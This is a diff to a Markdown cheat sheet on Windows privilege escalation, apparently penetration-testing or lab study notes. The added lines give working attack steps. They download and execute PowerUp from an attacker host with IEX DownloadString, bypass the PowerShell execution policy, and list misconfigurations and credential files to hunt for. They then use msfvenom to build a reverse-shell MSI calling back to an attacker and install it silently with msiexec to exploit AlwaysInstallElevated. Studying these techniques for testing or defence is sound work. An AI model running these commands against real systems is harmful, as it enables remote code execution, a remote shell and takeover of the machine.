@@ -12,11 +12,50 @@ net user
 net localgroup administrators
 ```
 ## PowerUp commands
-One way to share it, in power shell:
+One way to share it, in PowerShell:
 ```
 IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
 ```
+```
+powershell -ep bypass
+```
+Or:
+```
+powershell -ExecutionPolicy Bypass
+```
+Then run:
+```
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+```
+Then put your focus here:
+```
+Service Misconfigurations
+AlwaysInstallElevated
+Modifiable Services
+Modifiable Service Binaries
+Unquoted Service Paths
+Credential Files
+Writable Registry Keys
+```
 
+
+## Always Elevated
+
+If powerup shows up:
+
+```
+AlwaysInstallElevated: Enabled
+```
+Then we can make a msi exploit for it:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi
+```
+Then run the msi after sharing it:
+
+```
+msiexec /quiet /qn /i shell.msi
+```
 
 ## Low Hanging Fruit 
 
